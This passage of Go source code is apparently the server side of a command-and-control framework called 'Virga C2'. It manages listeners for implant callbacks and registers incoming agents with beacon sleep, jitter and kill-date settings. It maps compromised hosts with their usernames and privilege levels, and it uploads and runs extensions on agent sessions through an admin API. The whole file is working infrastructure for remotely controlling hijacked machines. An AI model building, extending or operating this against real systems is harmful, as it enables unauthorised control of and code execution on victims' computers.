		Label:  "Virga C2",
		Status: "active",
		Properties: map[string]interface{}{
			"hostname": serverHostname,
			"ip":       serverIP,
			"os":       "Server",
		},
		CreatedAt: time.Now().Format(time.RFC3339),
		UpdatedAt: time.Now().Format(time.RFC3339),
	}
	nodes = append(nodes, c2Node)

	// Add session nodes and edges
	for sessionID, sess := range s.sessions {
		// Determine node type based on OS
		nodeType := "workstation"
		if sess.OS != "" {
			// Check if it's a server OS
			if len(sess.OS) > 6 && (sess.OS[:6] == "Server" || sess.OS[len(sess.OS)-6:] == "Server") {
				nodeType = "server"
			}
		}

		// Extract IP address from RemoteAddr (remove port)
		remoteAddr := sess.RemoteAddr()
		ip := remoteAddr
		if host, _, err := net.SplitHostPort(remoteAddr); err == nil {
			ip = host
		}

		node := NodeInfo{
			ID:     sessionID,
			Type:   nodeType,
			Label:  sess.Hostname,
			Status: sess.Status,
			Properties: map[string]interface{}{
				"hostname":  sess.Hostname,
				"ip":        ip,
				"os":        sess.OS,
				"username":  sess.Username,
				"privilege": sess.Integrity,
			},
			CreatedAt: sess.CreatedAt.Format(time.RFC3339),
			UpdatedAt: sess.UpdatedAt.Format(time.RFC3339),
		}
		nodes = append(nodes, node)

		// Add edge from C2 to session
		edge := EdgeInfo{
			ID:     fmt.Sprintf("edge-c2-%s", sessionID),
			Source: "c2-server",
			Target: sessionID,
			Type:   "c2_connection",
			Label:  "HTTPS",
			Properties: map[string]interface{}{
				"protocol": "HTTPS",
				"port":     443,
			},
			CreatedAt: sess.CreatedAt.Format(time.RFC3339),
		}
		edges = append(edges, edge)
	}

	response := map[string]interface{}{
		"nodes": nodes,
		"edges": edges,
	}

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(response); err != nil {
		s.log.Error("Error encoding forest response: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
}

// handleCreateListener is the new listener creation API handler
func (s *Server) handleCreateListener(w http.ResponseWriter, r *http.Request) {
	// Parse request body
	var req struct {
		Name        string `json:"name"`
		Type        string `json:"type"`
		BindAddress string `json:"bind_address"`
		Port        int    `json:"port"`
		UseSSL      bool   `json:"use_ssl"`
		URIPath     string `json:"uri_path"`
		SSL         *struct {
			Cert string `json:"cert"`
			Key  string `json:"key"`
		} `json:"ssl,omitempty"`
		Encryption struct {
			Type string `json:"type"`
			Key  string `json:"key"`
		} `json:"encryption"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Invalid request body",
			"error":   err.Error(),
		})
		return
	}

	// Validate request
	if err := s.validateListenerRequest(&req); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Validation failed",
			"error":   err.Error(),
		})
		return
	}

	// Create listener config
	listenerCfg := config.ListenerConfig{
		Name:        req.Name,
		Type:        req.Type,
		BindAddress: req.BindAddress,
		Port:        req.Port,
		UseSSL:      req.UseSSL,
		URIPath:     req.URIPath,
		Encryption: config.EncryptionConfig{
			Type: req.Encryption.Type,
			Key:  req.Encryption.Key,
		},
	}

	if req.UseSSL && req.SSL != nil {
		listenerCfg.SSL = config.SSLConfig{
			Cert: req.SSL.Cert,
			Key:  req.SSL.Key,
		}
	}

	// Check for duplicate listener name and port
	s.listenersMu.Lock()
	defer s.listenersMu.Unlock()

	if _, exists := s.listenerConfigs[req.Name]; exists {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusConflict)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Listener with this name already exists",
		})
		return
	}

	// Check port conflict
	for _, cfg := range s.listenerConfigs {
		if cfg.Port == req.Port && cfg.BindAddress == req.BindAddress {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusConflict)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"message": fmt.Sprintf("Port %d on %s is already in use", req.Port, req.BindAddress),
			})
			return
		}
	}

	// Create listener
	newListener, err := listener.NewListener(listenerCfg)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Failed to create listener",
			"error":   err.Error(),
		})
		return
	}

	// Set debug mode
	newListener.SetDebugMode(s.debugMode)

	// Start listener in goroutine
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()

		s.log.Info("Starting listener: %s", req.Name)
		if err := newListener.Start(s.handleNewAgent); err != nil && err != http.ErrServerClosed {
			s.log.Error("Listener %s error: %v", req.Name, err)

			// Update status to "error"
			s.listenersMu.Lock()
			s.listenerStatus[req.Name] = "error"
			s.listenersMu.Unlock()
		}
	}()

	// Register listener
	s.listeners = append(s.listeners, newListener)
	s.listenerConfigs[req.Name] = listenerCfg
	s.listenerStatus[req.Name] = "starting"

	// Update status to "running" after short delay
	time.AfterFunc(2*time.Second, func() {
		s.listenersMu.Lock()
		defer s.listenersMu.Unlock()

		if status, exists := s.listenerStatus[req.Name]; exists && status == "starting" {
			s.listenerStatus[req.Name] = "running"
		}
	})

	// Success response
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Listener created successfully",
		"listener": map[string]interface{}{
			"name":         req.Name,
			"type":         req.Type,
			"bind_address": req.BindAddress,
			"port":         req.Port,
			"status":       "starting",
		},
	})
}

// handleDeleteListener is the listener deletion API handler
func (s *Server) handleDeleteListener(w http.ResponseWriter, r *http.Request) {
	// Get listener name from URL parameters
	vars := mux.Vars(r)
	name := vars["name"]

	if name == "" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Listener name is required",
		})
		return
	}

	s.listenersMu.Lock()
	defer s.listenersMu.Unlock()

	// Find the listener
	var targetListener listener.Listener
	targetIndex := -1

	for i, l := range s.listeners {
		if l.Name() == name {
			targetListener = l
			targetIndex = i
			break
		}
	}

	if targetListener == nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Listener not found",
		})
		return
	}

	// Stop the listener
	s.log.Info("Stopping listener: %s", name)
	if err := targetListener.Stop(); err != nil {
		s.log.Error("Error stopping listener %s: %v", name, err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Failed to stop listener",
			"error":   err.Error(),
		})
		return
	}

	// Remove from listeners slice
	s.listeners = append(s.listeners[:targetIndex], s.listeners[targetIndex+1:]...)

	// Remove metadata
	delete(s.listenerConfigs, name)
	delete(s.listenerStatus, name)

	s.log.Info("Listener %s deleted successfully", name)

	// Success response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Listener deleted successfully",
	})
}

// Start starts all listeners and runs the server
func (s *Server) Start() {
	// Initialize API routes
	s.initAPIRoutes()

	// Start API HTTP server
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()

		s.log.Info("Starting Admin API server on %s", s.apiServer.Addr)
		if err := s.apiServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			s.log.Error("Admin API server error: %v", err)
		}
	}()

	// Start MCP manager
	if s.mcpManager != nil && s.config.MCP.Enabled {
		s.wg.Add(1)
		go func() {
			defer s.wg.Done()

			s.log.Info("Starting MCP servers...")
			ctx := context.Background()
			if err := s.mcpManager.StartAll(ctx); err != nil {
				s.log.Error("MCP manager error: %v", err)
			}
		}()
	} else {
		if s.mcpManager == nil {
			s.log.Warn("MCP manager not initialized")
		} else if !s.config.MCP.Enabled {
			s.log.Info("MCP is disabled in config")
		}
	}

	// Set database reference for listeners
	listener.SetServerDatabase(s.db)

	// Set beacon manager reference for listeners
	listener.SetBeaconManager(s.beaconManager)

	// Start listeners
	for i, l := range s.listeners {
		listenerName := l.Name()

		// Update status to "starting"
		s.listenersMu.Lock()
		s.listenerStatus[listenerName] = "starting"
		s.listenersMu.Unlock()

		s.wg.Add(1)
		go func(listener listener.Listener, index int) {
			defer s.wg.Done()

			s.log.Info("Starting listener %d: %s", index+1, listener.Name())
			if err := listener.Start(s.handleNewAgent); err != nil && err != http.ErrServerClosed {
				s.log.Error("Listener %s error: %v", listener.Name(), err)

				// Update status to "error"
				s.listenersMu.Lock()
				s.listenerStatus[listener.Name()] = "error"
				s.listenersMu.Unlock()
			}
		}(l, i)

		// Wait a bit then update status to "running"
		time.AfterFunc(2*time.Second, func() {
			s.listenersMu.Lock()
			defer s.listenersMu.Unlock()

			if status, exists := s.listenerStatus[listenerName]; exists && status == "starting" {
				s.listenerStatus[listenerName] = "running"
			}
		})
	}

	// Session management loop
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		for !s.stopping {
			select {
			case <-ticker.C:
				s.sessionsMu.Lock()
				now := time.Now()
				if s.debugMode {
					s.log.Debug("Checking %d active sessions", len(s.sessions))
				}
				for id, sess := range s.sessions {
					// Handle timed out sessions
					if now.Sub(sess.LastSeen()) > s.config.Server.SessionTimeout {
						s.log.Info("Session %s timed out", id)
						listener.SetSessionHandler(id, nil) // Remove session handler
						delete(s.sessions, id)

						// Close session in database
						if err := s.db.CloseSession(id); err != nil {
							log.Printf("Failed to close session in database: %v", err)
						}
					}
				}
				s.sessionsMu.Unlock()
			}
		}
	}()
}

// handleNewAgent handles new agent connections
func (s *Server) handleNewAgent(agentID string, conn protocol.AgentConnection) {
	if s.debugMode {
		log.Printf("[DEBUG] Handling new agent connection: %s from %s",
			agentID, conn.RemoteAddr())
	}

	s.sessionsMu.Lock()
	defer s.sessionsMu.Unlock()

	// Check for existing session
	if existingSession, found := s.sessions[agentID]; found {
		log.Printf("Agent %s reconnected", agentID)
		existingSession.UpdateConnection(conn)
		// Inherit debug mode
		existingSession.SetDebugMode(s.debugMode)
		// Re-register as session handler
		listener.SetSessionHandler(agentID, existingSession)
		return
	}

	// Create new session
	newSession := session.NewSession(agentID, conn)
	// Set debug mode
	newSession.SetDebugMode(s.debugMode)
	s.sessions[agentID] = newSession

	// Register with session manager
	s.sessionManager.AddSession(newSession)

	// Register with beacon manager
	beaconConfig := &beacons.BeaconConfig{
		SleepTime:         30,
		Jitter:            20,
		MaxMissedCheckins: 3,
		KillDate:          time.Now().AddDate(1, 0, 0), // Default to 1 year from now
	}
	s.beaconManager.RegisterBeacon(agentID, beaconConfig)

	// Register as session handler
	listener.SetSessionHandler(agentID, newSession)

	log.Printf("New agent connected: %s", agentID)

	// Save to database
	if err := s.db.SaveAgent(agentID, conn.RemoteAddr()); err != nil {
		log.Printf("Failed to save agent to database: %v", err)
	}

	// Create session in database
	if err := s.db.CreateSession(agentID, agentID); err != nil {
		log.Printf("Failed to create session in database: %v", err)
	}
}

// GetSession returns a session by ID
func (s *Server) GetSession(sessionID string) (*session.Session, bool) {
	s.sessionsMu.RLock()
	defer s.sessionsMu.RUnlock()

	session, found := s.sessions[sessionID]
	return session, found
}

// GetAllSessions returns all active sessions
func (s *Server) GetAllSessions() []*session.Session {
	s.sessionsMu.RLock()
	defer s.sessionsMu.RUnlock()

	sessions := make([]*session.Session, 0, len(s.sessions))
	for _, sess := range s.sessions {
		sessions = append(sessions, sess)
	}
	return sessions
}

// handleUploadExtension handles extension upload requests
func (s *Server) handleUploadExtension(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]

	if s.debugMode {
		log.Printf("[DEBUG] API request: POST /api/sessions/%s/extensions from %s",
			sessionID, r.RemoteAddr)
	}

	// Parse multipart form
	err := r.ParseMultipartForm(100 << 20) // 100MB max
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Failed to parse form data",
			"error":   err.Error(),
		})
		return
	}

	// Get manifest JSON
	manifestStr := r.FormValue("manifest")
	if manifestStr == "" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Missing manifest",
		})
		return
	}

	// Parse manifest
	var manifest protocol.ExtensionManifest
	if err := json.Unmarshal([]byte(manifestStr), &manifest); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Invalid manifest format",
			"error":   err.Error(),
		})
		return
	}

	// Get uploaded file
	file, _, err := r.FormFile("data")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Missing extension data",
			"error":   err.Error(),
		})
		return
	}
	defer file.Close()

	// Read file data
	data := make([]byte, 0)
	buf := make([]byte, 1024*1024) // 1MB buffer
	for {
		n, err := file.Read(buf)
		if n > 0 {
			data = append(data, buf[:n]...)
		}
		if err != nil {
			if err.Error() != "EOF" {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusInternalServerError)
				json.NewEncoder(w).Encode(map[string]interface{}{
					"success": false,
					"message": "Failed to read extension data",
					"error":   err.Error(),
				})
				return
			}
			break
		}
	}

	// Upload extension
	if err := s.extensionManager.UploadExtension(sessionID, manifest, data); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Failed to upload extension",
			"error":   err.Error(),
		})
		return
	}

	// Success response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Extension uploaded successfully",
		"extension": map[string]interface{}{
			"name":    manifest.Name,
			"version": manifest.Version,
		},
	})
}

// handleListExtensions handles extension listing requests
func (s *Server) handleListExtensions(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]

	if s.debugMode {
		log.Printf("[DEBUG] API request: GET /api/sessions/%s/extensions from %s",
			sessionID, r.RemoteAddr)
	}

	// List extensions
	manifests, err := s.extensionManager.ListExtensions(sessionID)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Failed to list extensions",
			"error":   err.Error(),
		})
		return
	}

	// Success response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success":    true,
		"extensions": manifests,
	})
}

// handleExecuteExtension handles extension execution requests
func (s *Server) handleExecuteExtension(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]
	extensionName := vars["name"]

	if s.debugMode {
		s.log.Debug("API request: POST /api/sessions/%s/extensions/%s/execute from %s",
			sessionID, extensionName, r.RemoteAddr)
	}

	// Parse request body
	var request struct {
		Command   string                 `json:"command"`
		Arguments map[string]interface{} `json:"arguments"`
	}

	if err := json.NewDecoder(r.Body).Decode(&request); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Invalid request format",
			"error":   err.Error(),
		})
		return
	}

	// Execute extension
	if err := s.extensionManager.ExecuteExtension(sessionID, extensionName, request.Command, request.Arguments); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Failed to execute extension",
			"error":   err.Error(),
		})
		return
	}

	// Success response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Extension execution task queued",
	})
}

// handleDeleteExtension handles extension deletion requests
func (s *Server) handleDeleteExtension(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]
	extensionName := vars["name"]

	if s.debugMode {
		log.Printf("[DEBUG] API request: DELETE /api/sessions/%s/extensions/%s from %s",
			sessionID, extensionName, r.RemoteAddr)
	}

	// Delete extension
	if err := s.extensionManager.DeleteExtension(sessionID, extensionName); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Failed to delete extension",
			"error":   err.Error(),
		})
		return
	}

	// Success response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Extension deleted successfully",
	})
}

// Shutdown shuts down the server and all listeners
func (s *Server) Shutdown() {
	s.stopping = true

	// Stop API server
	if err := s.apiServer.Close(); err != nil {
		log.Printf("Error closing API server: %v", err)
	}

	// Stop MCP manager
	if s.mcpManager != nil {
		ctx := context.Background()
		if err := s.mcpManager.Shutdown(ctx); err != nil {
			s.log.Error("Error closing MCP manager: %v", err)
		}
	}

	// Stop listeners
	for _, l := range s.listeners {
		if s.debugMode {
			s.log.Debug("Stopping listener: %s", l.Name())
		}
		if err := l.Stop(); err != nil {
			s.log.Error("Error stopping listener %s: %v", l.Name(), err)
		}
	}

	// Wait for all goroutines to finish
	s.wg.Wait()
	s.log.Info("Server shutdown complete")
}

// validateListenerRequest validates the listener creation request
func (s *Server) validateListenerRequest(req *struct {
	Name        string `json:"name"`
	Type        string `json:"type"`
	BindAddress string `json:"bind_address"`
	Port        int    `json:"port"`
	UseSSL      bool   `json:"use_ssl"`
	URIPath     string `json:"uri_path"`
	SSL         *struct {
		Cert string `json:"cert"`
		Key  string `json:"key"`
	} `json:"ssl,omitempty"`
	Encryption struct {
		Type string `json:"type"`
		Key  string `json:"key"`
	} `json:"encryption"`
}) error {
	// Required fields
	if req.Name == "" {
		return fmt.Errorf("name is required")
	}

	if req.Type == "" {
		return fmt.Errorf("type is required")
	}

	// Supported types
	validTypes := map[string]bool{
		"http":  true,
		"https": true,
	}

	if !validTypes[req.Type] {
		return fmt.Errorf("unsupported listener type: %s (supported: http, https)", req.Type)
	}

	// Port number
	if req.Port < 1 || req.Port > 65535 {
		return fmt.Errorf("invalid port number: %d (must be 1-65535)", req.Port)
	}

	// SSL configuration
	if req.UseSSL {
		if req.SSL == nil {
			return fmt.Errorf("ssl configuration is required when use_ssl is true")
		}

		if req.SSL.Cert == "" || req.SSL.Key == "" {
			return fmt.Errorf("ssl cert and key are required")
		}

		// Check certificate files exist
		if _, err := os.Stat(req.SSL.Cert); err != nil {
			return fmt.Errorf("ssl cert file not found: %s", req.SSL.Cert)
		}

		if _, err := os.Stat(req.SSL.Key); err != nil {
			return fmt.Errorf("ssl key file not found: %s", req.SSL.Key)
		}
	}

	// Encryption configuration
	if req.Encryption.Type == "" {
		return fmt.Errorf("encryption type is required")
	}

	if req.Encryption.Key == "" {
		return fmt.Errorf("encryption key is required")
	}

	if len(req.Encryption.Key) < 32 {
		return fmt.Errorf("encryption key must be at least 32 characters")
	}

	// URIPath
	if req.URIPath == "" {
		return fmt.Errorf("uri_path is required")
	}

	return nil
}
